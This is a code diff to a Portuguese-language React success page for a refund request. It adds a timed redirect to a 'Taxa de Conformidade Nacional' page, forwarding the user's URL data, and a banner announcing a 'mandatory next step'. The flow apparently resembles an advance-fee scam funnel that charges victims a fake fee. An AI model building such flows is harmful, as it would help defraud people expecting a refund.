@@ -74,6 +74,16 @@ export default function Sucesso() {
     });
   };
 
+  // Redirecionar para a página de Taxa de Conformidade Nacional (TCN) após alguns segundos
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      const params = new URLSearchParams(window.location.search);
+      setLocation(`/tcn?${params.toString()}`);
+    }, 7000); // 7 segundos
+    
+    return () => clearTimeout(timer);
+  }, [setLocation]);
+
   useEffect(() => {
     // Recuperar dados da URL
     const params = new URLSearchParams(window.location.search);
@@ -217,6 +227,11 @@ export default function Sucesso() {
                 <span className="font-medium">{dadosSolicitacao.nome.split(" ")[0]}</span>, sua solicitação de restituição foi registrada e confirmada. 
                 Agora sua solicitação entrará na fase de análise documental para liberação do pagamento.
               </p>
+              <div className="mt-4 bg-blue-50 p-3 rounded-lg border border-blue-200 text-sm">
+                <p className="text-blue-700">
+                  <span className="font-semibold">Atenção:</span> Você será redirecionado em instantes para a próxima etapa obrigatória do processo.
+                </p>
+              </div>
             </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
